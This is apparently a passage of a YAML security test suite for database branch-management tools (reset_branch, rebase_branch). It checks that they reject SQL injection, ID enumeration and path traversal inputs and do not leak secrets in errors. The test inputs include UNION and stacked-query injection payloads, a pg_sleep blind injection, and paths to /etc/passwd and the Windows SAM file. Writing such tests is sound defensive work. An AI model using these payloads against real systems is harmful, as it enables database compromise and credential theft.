            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - project_[a-zA-Z0-9]{20,}
                - org-[a-zA-Z0-9-]{20,}
                - user-[a-zA-Z0-9-]{20,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to reset branch using sequential ID enumeration
          input:
            tool: reset_branch
            arguments:
                branch_id: "999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - branch_[a-zA-Z0-9]{10,}
                - '[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}'
                - Bearer [a-zA-Z0-9_-]{20,}
            result: null
    - test_id: SEC-002
      name: SQL Injection in Branch ID Parameter
      purpose: |
        Tests for SQL injection vulnerabilities in the branch_id parameter that could allow
        attackers to execute arbitrary SQL commands, potentially accessing or modifying
        database contents, bypassing authentication, or causing denial of service.
        CRITICAL severity due to potential for complete database compromise.
      test_cases:
        - case_id: SEC-002-A
          description: Boolean-based SQL injection attempt
          input:
            tool: reset_branch
            arguments:
                branch_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - (?i)syntax error
                - (?i)postgres
                - (?i)relation.*does not exist
                - (?i)column.*does not exist
            result: null
        - case_id: SEC-002-B
          description: UNION-based SQL injection with schema enumeration
          input:
            tool: reset_branch
            arguments:
                branch_id: ''' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=''public''--'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - (?i)information_schema
                - (?i)pg_catalog
                - (?i)auth\.users
                - (?i)table_name
            result: null
        - case_id: SEC-002-C
          description: Stacked query injection for table manipulation
          input:
            tool: reset_branch
            arguments:
                branch_id: valid_id'; CREATE TABLE test_sec002 AS SELECT 1; DROP TABLE test_sec002; --
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - -32602
            error_response_must_not_match_regex:
                - (?i)CREATE TABLE
                - (?i)DROP TABLE
                - (?i)successfully created
            result: null
    - test_id: SEC-003
      name: SQL Injection in Migration Version Parameter
      purpose: |
        Tests for SQL injection in the optional migration_version parameter. Since this
        parameter specifies which migration version to reset to, injection here could
        allow attackers to manipulate database state, access migration history containing
        sensitive schema information, or execute arbitrary SQL. HIGH severity as it's
        optional but still destructive if exploited.
      prerequisites:
        - description: Obtain from list_branches tool or user configuration
          variable: VALID_BRANCH_ID
      test_cases:
        - case_id: SEC-003-A
          description: SQL injection via migration version with comment bypass
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: '20240101000000'' OR 1=1-- '
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - (?i)migration.*applied
                - (?i)schema_migrations
                - (?i)version.*timestamp
            result: null
        - case_id: SEC-003-B
          description: Migration version with UNION-based data extraction
          input:
            tool: reset_branch
            arguments:
                branch_id: ${VALID_BRANCH_ID}
                migration_version: ''' UNION SELECT password FROM auth.users--'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - \$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}
                - (?i)auth\.users
                - (?i)password
                - '[a-f0-9]{64}'
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests whether error messages leak sensitive information such as internal database
        structure, file paths, authentication tokens, migration details, or system configuration.
        HIGH severity as information disclosure can aid attackers in crafting more sophisticated
        attacks against the system.
      test_cases:
        - case_id: SEC-004-A
          description: Check for database schema disclosure in invalid branch ID error
          input:
            tool: reset_branch
            arguments:
                branch_id: invalid<>branch/id\test
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - /var/lib/postgresql
                - /home/[a-zA-Z0-9_-]+/[a-zA-Z0-9_/-]+
                - (?i)stack trace
                - (?i)at line [0-9]+
                - Bearer [a-zA-Z0-9_-]{20,}
                - postgresql://[^\s]+
                - (?i)database:\s*[a-zA-Z0-9_]+
            result: null
        - case_id: SEC-004-B
          description: Check for internal IP and hostname disclosure
          input:
            tool: reset_branch
            arguments:
                branch_id: ../../../etc/passwd
                migration_version: "99999999999999"
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - (?i)10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}
                - (?i)172\.(1[6-9]|2[0-9]|3[0-1])\.[0-9]{1,3}\.[0-9]{1,3}
                - (?i)192\.168\.[0-9]{1,3}\.[0-9]{1,3}
                - (?i)localhost:[0-9]{2,5}
                - (?i)[a-z0-9-]+\.internal
                - (?i)[a-z0-9-]+\.local
            result: null
    - test_id: SEC-001
      name: Unauthorized Branch Access via Branch ID Manipulation
      purpose: |
        Tests if the rebase_branch tool properly validates branch ownership and access control.
        An attacker could attempt to rebase branches from other projects/organizations by guessing
        or enumerating branch IDs. This could lead to unauthorized access to other tenants' database
        schemas, migrations, and potentially sensitive data exposure through migration logs.
        Impact: Cross-tenant data access, privilege escalation, information disclosure.
      test_cases:
        - case_id: SEC-001-A
          description: Attempt to rebase branch using null UUID to test ID validation
          input:
            tool: rebase_branch
            arguments:
                branch_id: 00000000-0000-0000-0000-000000000000
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - postgresql://[^@]+:[^@]+@[^/]+
                - Bearer [a-zA-Z0-9_\-]{20,}
                - postgres\.[a-zA-Z0-9\-]+\.supabase
                - password["']?\s*[:=]\s*["']?[^\s"']{8,}
            result: null
        - case_id: SEC-001-B
          description: Attempt to rebase branch using extremely large non-existent ID to trigger enumeration protections
          input:
            tool: rebase_branch
            arguments:
                branch_id: 99999999-9999-9999-9999-999999999999
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - branch[_\s]+(?:does\s+not\s+)?exist[s]?\s+for\s+project[_\s]+[a-zA-Z0-9\-]+
                - /projects/[a-zA-Z0-9\-]+/branches
                - project[_\s]id["']?\s*[:=]\s*["']?[a-zA-Z0-9\-]+
            result: null
        - case_id: SEC-001-C
          description: Test with another user's valid branch ID format to verify cross-tenant isolation
          input:
            tool: rebase_branch
            arguments:
                branch_id: aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee
          expected_output:
            error_present: true
            error_code_one_of:
                - 403
                - 404
                - -32602
            error_response_must_not_match_regex:
                - user[_\s]id["']?\s*[:=]\s*["']?[a-zA-Z0-9\-]+
                - owner["']?\s*[:=]\s*["']?[a-zA-Z0-9\-]+
                - organization[_\s]id["']?\s*[:=]\s*["']?
            result: null
    - test_id: SEC-002
      name: SQL Injection via Branch ID Parameter
      purpose: |
        Tests if the branch_id parameter is properly sanitized before being used in database queries.
        Since this tool interacts with branch management and migrations, the branch_id could be used
        in SQL queries to identify the target branch. SQL injection could allow an attacker to:
        - Extract sensitive data from the control plane database
        - Modify or delete branch configurations
        - Bypass authentication/authorization checks
        - Access other customers' branch information
        Impact: Complete database compromise, data exfiltration, unauthorized modifications.
      test_cases:
        - case_id: SEC-002-A
          description: Basic SQL injection with OR clause to test query sanitization
          input:
            tool: rebase_branch
            arguments:
                branch_id: ''' OR ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - syntax\s+error\s+at\s+or\s+near
                - pg_[a-z_]+\(
                - SELECT\s+.*\s+FROM\s+[a-z_]+
                - ERROR:\s+relation\s+"[^"]+"\s+does\s+not\s+exist
            result: null
        - case_id: SEC-002-B
          description: UNION-based SQL injection to test for result set manipulation
          input:
            tool: rebase_branch
            arguments:
                branch_id: ''' UNION SELECT id, name, connection_string FROM branches WHERE ''1''=''1'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - connection[_\s]string["']?\s*[:=]
                - host["']?\s*[:=]\s*["']?[a-zA-Z0-9\.\-]+
                - postgresql://[^\s]+
                - UNION
            result: null
        - case_id: SEC-002-C
          description: Time-based blind SQL injection with comment injection
          input:
            tool: rebase_branch
            arguments:
                branch_id: '''; SELECT pg_sleep(2); --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - pg_sleep
                - \-\-
                - statement\s+timeout
            result: null
    - test_id: SEC-003
      name: Path Traversal in Branch ID to Access System Resources
      purpose: |
        Tests if the branch_id could be used to perform path traversal attacks if the system
        uses branch IDs to construct file paths for migration files, logs, or configuration.
        Migration operations often involve file system access for storing/reading migration files.
        A path traversal vulnerability could allow:
        - Reading sensitive system files (/etc/passwd, SSH keys, config files)
        - Accessing other branches' migration files
        - Reading application secrets or environment variables
        Impact: Information disclosure, credential theft, lateral movement.
      test_cases:
        - case_id: SEC-003-A
          description: Unix path traversal to attempt reading system password file
          input:
            tool: rebase_branch
            arguments:
                branch_id: ../../../etc/passwd
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - daemon:.*:/usr/sbin
                - bin:.*:/bin
            result: null
        - case_id: SEC-003-B
          description: Windows path traversal to attempt accessing system configuration
          input:
            tool: rebase_branch
            arguments:
                branch_id: ..\..\..\windows\system32\config\sam
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - 404
                - -32602
            error_response_must_not_match_regex:
                - 'Administrator:'
                - \\windows\\system32
                - C:\\[Ww]indows
            result: null
        - case_id: SEC-003-C
          description: Null byte injection with path traversal
          input:
            tool: rebase_branch
            arguments:
                branch_id: ../../../etc/passwd%00.txt
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - 'root:.*:0:0:'
                - '%00'
                - \x00
            result: null
    - test_id: SEC-004
      name: Information Disclosure in Error Messages
      purpose: |
        Tests if error messages expose sensitive information such as:
        - Internal file paths or directory structures
        - Database connection strings or credentials
        - Stack traces revealing code structure
        - Internal API endpoints or service names
        - Branch names or IDs from other tenants
        Verbose error messages can aid attackers in reconnaissance and exploitation.
        Impact: Information leakage enabling further attacks, credential exposure.
      test_cases:
        - case_id: SEC-004-A
          description: Test for stack trace disclosure with malformed UUID
          input:
            tool: rebase_branch
            arguments:
                branch_id: not-a-uuid-!@#$%
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - at\s+[a-zA-Z0-9_]+\.[a-zA-Z0-9_]+\([^)]+:\d+:\d+\)
                - File\s+"[^"]+",\s+line\s+\d+
                - /home/[a-zA-Z0-9_\-]+/
                - /app/[a-zA-Z0-9_\-]+/
                - Traceback\s+\(most\s+recent\s+call\s+last\)
            result: null
        - case_id: SEC-004-B
          description: Test for database connection string disclosure with special characters
          input:
            tool: rebase_branch
            arguments:
                branch_id: '''; SELECT version(); --'
          expected_output:
            error_present: true
            error_code_one_of:
                - 400
                - -32602
            error_response_must_not_match_regex:
                - postgresql://[^@]+:[^@]+@
                - postgres://[^\s]+
                - password["']?\s*[:=]\s*["']?[^\s"']{6,}
                - SUPABASE_[A-Z_]+["']?\s*[:=]
                - DB_[A-Z_]+["']?\s*[:=]
            result: null
